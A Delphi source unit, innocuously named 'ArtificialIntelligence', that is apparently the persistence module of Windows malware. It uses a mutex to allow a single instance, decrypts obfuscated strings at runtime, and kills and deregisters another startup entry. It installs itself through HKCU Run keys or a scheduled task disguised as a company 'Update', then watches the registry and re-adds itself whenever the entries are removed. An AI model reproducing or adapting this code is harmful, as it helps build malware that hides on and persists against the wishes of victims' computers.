unit uAI;

interface

uses
  Windows, Classes, SysUtils, StrUtils, uTypes, Forms, uFnc, uTsk, uRM, uEnc, uEof;

type
  TArtificialIntelligence = class(TComponent)
  private
    ConfigData: TCnfg;
    RMon: TRMon;
    procedure CStup(Sender: TObject);
    function CSTask(): Boolean;
  public
    constructor Create(AOwner: TComponent; Config: TCnfg);
    procedure Run;
  end;

implementation

constructor TArtificialIntelligence.Create(AOwner: TComponent; Config: TCnfg);
begin
  inherited Create(Owner);

  // Set Config
  ConfigData := Config;

  // Create Mutex
  if MtxEx(ConfigData.RnMtx) then Halt;
  CreateMutex(nil, false, PChar(ConfigData.RnMtx));
end;

{****************************************************************************
                                  AI Event
****************************************************************************}

procedure TArtificialIntelligence.Run;
begin
  Delay(30000);

  // Add Startup Methods
  CStup(Self);

  // Delete Synaptics StartupKey
  KlPrc(DE('axeBdm6eRQ8P2FKQED'));
  DlKy(HKEY_CURRENT_USER, DE('apdo/C0t92xh/HVKGNqVyd04QSa9ipDMVIa2SAABRoIarOSgBRSOTR5tvWq6'), DE('axeBdm6eRQ8P4Fjc3CLumknaplitaqeR+Pey3qmkOQH'));
end;

{****************************************************************************
                                  AI Functions
****************************************************************************}

procedure TArtificialIntelligence.CStup(Sender: TObject);
var
  Keys: array[1..3] of string;
  RS: TResourceStream;
  VBPath: string;
  VBContext: AnsiString;
begin
  Keys[1] := DE('apdo/C0t92xh/HVKGNqVyd04QSa9ipDMVIa2SAABRoIarOSgBRSOTR5tvWq6');
  Keys[2] := DE('apdo/C0t92xh/HVKGNqVyd04QSa9ipDMVIa2SAABRoIarOSgBRSOTR5ttylHFAId2Qjbx8dE7tGtJvEmtRdO');

  // Create APP StartUP
  if not ConfigData.iAd then begin
    if ConfigData.SO = 'XP' then begin
      DlKy(HKEY_CURRENT_USER, Keys[1], ConfigData.PrtNa);
      StKy(HKEY_CURRENT_USER, Keys[2], ConfigData.PrtNa, ParamStr(0));
    end else
      if GtKy(HKEY_CURRENT_USER, Keys[2], ConfigData.PrtNa) = '' then
        StKy(HKEY_CURRENT_USER, Keys[1], ConfigData.PrtNa, ParamStr(0));
  end else begin
    if CSTask then begin
      // Remove Reg Record
      DlKy(HKEY_CURRENT_USER, Keys[1], ConfigData.PrtNa);
      DlKy(HKEY_CURRENT_USER, Keys[2], ConfigData.PrtNa);

      Exit;
    end else begin
      DlKy(HKEY_CURRENT_USER, Keys[1], ConfigData.PrtNa);
      StKy(HKEY_CURRENT_USER, Keys[2], ConfigData.PrtNa, ParamStr(0));
    end;
  end;

  // Registry Monitor
  if not Assigned(RMon) then begin
    RMon := TRMon.Create(Self);
    RMon.RKey := HKEY_CURRENT_USER;
    if ConfigData.SO = 'XP' then
      RMon.MKey := Keys[2]
    else
      RMon.MKey := IfThen(ConfigData.iAd, Keys[2], Keys[1]);
    RMon.OnChange := CStup;
  end;
end; { CreateStartup -> Baþlangýç Girdilerini Ayarlar }

function TArtificialIntelligence.CSTask(): Boolean;
var
  Tasks: TTsk;
  TaskData: TTskDt;
  XmlPath, XmlText: string;
  Xml: TextFile;
begin
  // Create XML File Path
  XmlPath := IncludeTrailingPathDelimiter(GtTeD) + GtRanStr(3) + DE('n4wyJD');

  // Get Resource Text
  XmlText := DE(GtReTe('TK'));
  XmlText := StringReplace(XmlText, '%Company%', ConfigData.PrtNa, [rfReplaceAll, rfIgnoreCase]);
  XmlText := StringReplace(XmlText, '%Path%', ParamStr(0), [rfReplaceAll, rfIgnoreCase]);

  // Save To File
  with TStringList.Create do begin
    Add(XmlText);
    SaveToFile(XmlPath);
    Free;
  end;

  // Create Scheduled Task Data
  Tasks := TTsk.Create(Self, ConfigData.SO);
  if Tasks.Check(ConfigData.PrtNa + ' Update') then
    Result := True
  else
    Result := Tasks.AddXml(ConfigData.PrtNa + ' Update', XmlPath, False);

  Tasks.Free;

  // Remove XML
  DeleteFile(XmlPath);
end; { CreateStartup -> Zamanlanmýþ Görev Oluþturur }

end.

